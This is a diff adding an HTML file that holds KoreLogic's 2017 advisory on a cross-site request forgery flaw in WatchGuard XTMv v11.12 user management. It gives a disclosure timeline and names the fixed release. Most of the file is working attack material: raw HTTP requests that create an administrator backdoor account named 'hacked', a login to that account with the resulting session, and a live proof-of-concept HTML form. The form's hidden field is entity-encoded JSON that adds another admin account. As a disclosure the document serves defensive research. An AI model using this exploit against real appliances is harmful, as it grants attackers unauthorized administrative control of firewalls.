@@ -1,0 +1,173 @@
+<!--
+KL-001-2017-004 : WatchGuard XTMv User Management Cross-Site Request Forgery
+
+Title: WatchGuard XTMv User Management Cross-Site Request Forgery
+Advisory ID: KL-001-2017-004
+Publication Date: 2017.03.10
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2017-004.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: WatchGuard
+     Affected Product: XTMv
+     Affected Version: v11.12 Build 516911
+     Platform: Embedded Linux
+     CWE Classification: CWE-352: Cross-Site Request Forgery (CSRF)
+     Impact: Privileged Access
+     Attack vector: HTTP
+
+2. Vulnerability Description
+
+     Lack of CSRF protection in the Add User functionality of the
+     XTMv management portal can be leveraged to create arbitrary
+     administrator-level accounts.
+
+3. Technical Description
+
+     As observed below, no CSRF token is in use when adding a new
+     user to the management portal.
+
+     POST /put_data/ HTTP/1.1
+     Host: 1.3.3.7:8080
+     Accept: */*
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate, br
+     Content-Type: application/json
+     X-Requested-With: XMLHttpRequest
+     Content-Length: 365
+     Cookie: session_id=50f607247265897581a407bfb8b75e30d2b77287
+     DNT: 1
+     Connection: close
+
+
+{"__class__":"PageSystemManageAdminUsersObj","__module__":"modules.scripts.page.system.PageSystemManageAdminUsersObj","users":[],"add_entries":[{"__class__":"AdminUserObj","__module__":"modules.scripts.vo.AdminUserObj","name":"hacked","domain":"Firebox-DB","role":"Device
+Administrator","hash":"hacked","enabled":1,"rowindex":-1}],"upd_entries":[],"del_entries":[]}
+
+     The HTTP response indicates that the changes were successful.
+
+     HTTP/1.1 200 OK
+     X-Frame-Options: SAMEORIGIN
+     Content-Length: 68
+     Expires: Sun, 28 Jan 2007 00:00:00 GMT
+     Vary: Accept-Encoding
+     Server: CherryPy/3.6.0
+     Pragma: no-cache
+     Cache-Control: no-cache, must-revalidate
+     Date: Sat, 10 Dec 2016 18:08:22 GMT
+     Content-Type: application/json
+     Set-Cookie: session_id=50f607247265897581a407bfb8b75e30d2b77287; expires=Sat, 10 Dec 2016 19:08:22 GMT; httponly;
+Path=/; secure
+     Connection: close
+
+     {"status": true, "message": ["The changes were saved successfully"]}
+
+     Now, the newly created backdoor account can be accessed.
+
+     POST /agent/login HTTP/1.1
+     Host: 1.3.3.7:8080
+     Accept: application/xml, text/xml, */*; q=0.01
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate, br
+     Content-Type: text/xml
+     X-Requested-With: XMLHttpRequest
+     Content-Length: 414
+     Cookie: sessionid=515F007C5BD062C2122008544DB127F80000000C; session_id=0a3d24668f5c3b2c7ba7016d179f5f574e1aaf53
+     DNT: 1
+     Connection: close
+
+
+<methodCall><methodName>login</methodName><params><param><value><struct><member><name>password</name><value><string>hacked</string></value></member><member><name>user</name><value><string>hacked</string></value></member><member><name>domain</name><value><string>Firebox-DB</string></value></member><member><name>uitype</name><value><string>2</string></value></member></struct></value></param></params></methodCall>
+
+     The response below shows the application issuing an authenticated
+     session cookie.
+
+     HTTP/1.1 200 OK
+     X-Frame-Options: SAMEORIGIN
+     Content-type: text/xml
+     Set-Cookie: sessionid=74B0DC5119495CFF2AE8944A625558EC00000008;secure;HttpOnly
+     Connection: close
+     Date: Sat, 10 Dec 2016 19:55:26 GMT
+     Server: none
+     Content-Length: 751
+
+     <?xml version="1.0"?>
+     <methodResponse>
+       <params>
+         <param>
+           <value>
+             <struct>
+               <member><name>sid</name><value>74B0DC5119495CFF2AE8944A625558EC00000008</value></member>
+               <member><name>response</name><value></value></member>
+               <member>
+                 <name>readwrite</name>
+                 <value><struct>
+                   <member><name>privilege</name><value>2</value></member>
+                   <member><name>peer_sid</name><value>0</value></member>
+                   <member><name>peer_name</name><value>error</value></member>
+                   <member><name>peer_ip</name><value>0.0.0.0</value></member>
+                 </struct></value>
+               </member>
+             </struct>
+           </value>
+         </param>
+       </params>
+     </methodResponse>
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor has remediated this vulnerability in WatchGuard
+     XTMv v11.12.1. Release notes and upgrade instructions are
+     available at:
+
+     https://www.watchguard.com/support/release-notes/fireware/11/en-US/EN_ReleaseNotes_Fireware_11_12_1/index.html
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc. and Joshua Hardin.
+
+6. Disclosure Timeline
+
+     2017.01.13 - KoreLogic sends vulnerability report and PoC to
+                  WatchGuard.
+     2017.01.13 - WatchGuard acknowledges receipt of report.
+     2017.01.23 - WatchGuard informs KoreLogic that the
+                  vulnerability will be addressed in the forthcoming
+                  v11.12.1 firmware, scheduled for general
+                  availability on or around 2017.02.21.
+     2017.02.22 - WatchGuard releases v11.12.1.
+     2017.03.10 - KoreLogic public disclosure.
+
+7. Proof of Concept
+-->
+
+     <html>
+       <body>
+         <form action="https://1.3.3.7:8080/put_data/" method="POST" enctype="text/plain">
+           <input type="hidden"
+name="&#x7b;"&#x5f;&#x5f;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;"&#x3a;"&#x50;&#x61;&#x67;&#x65;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x41;&#x64;&#x6d;&#x69;&#x6e;&#x55;&#x73;&#x65;&#x72;&#x73;&#x4f;&#x62;&#x6a;"&#x2c;"&#x5f;&#x5f;&#x6d;&#x6f;&#x64;&#x75;&#x6c;&#x65;&#x5f;&#x5f;"&#x3a;"&#x6d;&#x6f;&#x64;&#x75;&#x6c;&#x65;&#x73;&#x2e;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x73;&#x2e;&#x70;&#x61;&#x67;&#x65;&#x2e;&#x73;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x50;&#x61;&#x67;&#x65;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x41;&#x64;&#x6d;&#x69;&#x6e;&#x55;&#x73;&#x65;&#x72;&#x73;&#x4f;&#x62;&#x6a;"&#x2c;"&#x75;&#x73;&#x65;&#x72;&#x73;"&#x3a;&#x5b;&#x5d;&#x2c;"&#x61;&#x64;&#x64;&#x5f;&#x65;&#x6e;&#x74;&#x72;&#x69;&#x65;&#x73;"&#x3a;&#x5b;&#x7b;"&#x5f;&#x5f;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;"&#x3a;"&#x41;&#x64;&#x6d;&#x69;&#x6e;&#x55;&#x73;&#x65;&#x72;&#x4f;&#x62;&#x6a;"&#x2c;"&#x5f;&#x5f;&#x6d;&#x6f;&#x64;&#x75;&#x6c;&#x65;&#x5f;&#x5f;"&#x3a;"&#x6d;&#x6f;&#x64;&#x75;&#x6c;&#x65;&#x73;&#x2e;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x73;&#x2e;&#x76;&#x6f;&#x2e;&#x41;&#x64;&#x6d;&#x69;&#x6e;&#x55;&#x73;&#x65;&#x72;&#x4f;&#x62;&#x6a;"&#x2c;"&#x6e;&#x61;&#x6d;&#x65;"&#x3a;"&#x68;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x33;"&#x2c;"&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;"&#x3a;"&#x46;&#x69;&#x72;&#x65;&#x62;&#x6f;&#x78;&#x2d;&#x44;&#x42;"&#x2c;"&#x72;&#x6f;&#x6c;&#x65;"&#x3a;"&#x44;&#x65;&#x76;&#x69;&#x63;&#x65;&#x20;&#x41;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;"&#x2c;"&#x68;&#x61;&#x73;&#x68;"&#x3a;"&#x68;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x33;"&#x2c;"&#x65;&#x6e;&#x61;&#x62;&#x6c;&#x65;&#x64;"&#x3a;&#x31;&#x2c;"&#x72;&#x6f;&#x77;&#x69;&#x6e;&#x64;&#x65;&#x78;"&#x3a;&#x2d;&#x31;&#x7d;&#x5d;&#x2c;"&#x75;&#x70;&#x64;&#x5f;&#x65;&#x6e;&#x74;&#x72;&#x69;&#x65;&#x73;"&#x3a;&#x5b;&#x5d;&#x2c;"&#x64;&#x65;&#x6c;&#x5f;&#x65;&#x6e;&#x74;&#x72;&#x69;&#x65;&#x73;"&#x3a;&#x5b;&#x5d;&#x7d;"
+value="" />
+           <input type="submit" value="Trigger" />
+         </form>
+       </body>
+     </html>
+
+<!--
+The contents of this advisory are copyright(c) 2017
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
+-->
